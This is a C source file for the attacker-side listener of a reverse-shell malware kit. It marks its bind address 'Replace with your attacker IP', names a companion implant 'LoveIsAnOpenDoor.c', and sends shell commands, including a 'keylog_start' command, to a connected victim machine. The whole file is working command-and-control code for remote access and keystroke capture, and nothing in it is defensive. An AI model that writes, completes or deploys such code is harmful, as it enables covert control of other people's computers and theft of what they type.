#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include  <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(){
	int sock, client_socket;
	char buffer[1024]; //To transport user commands
	char response[18384]; //Same response from LoveIsAnOpenDoor.c
	struct sockaddr_in server_address, client_address;
	int i=0;
	int optval=1;
	socklen_t client_length;
	
	//Create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	//Check for errors
	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) <0 ){
	printf("Error Setting TCP Socket Options!\n");
	return 1;
	}
	
	server_address.sin_family=AF_INET;
	server_address.sin_addr.s_addr = inet_addr("SETADDRESSHERE"); //Replace with your attacker IP
	//Set Free port
	server_address.sin_port = htons(50005);

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 5);
	client_length =  sizeof(client_address);
	
	//Accept connection
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
	
	while(1){
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		//Gather response and send response
		printf("* Shell#%s~: ",inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "/n");
		write(client_socket, buffer,sizeof(buffer));
		if (strncmp("q", buffer, 1) == 0){
			break;
		}else if(strncmp("cd ", buffer, 3)== 0){
			goto jump; //Jump back to next command
		}else if(strncmp("keylog_start", buffer, 12)==0){
			goto jump; 
		}else{ //Recieve the response
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
		
	}
}
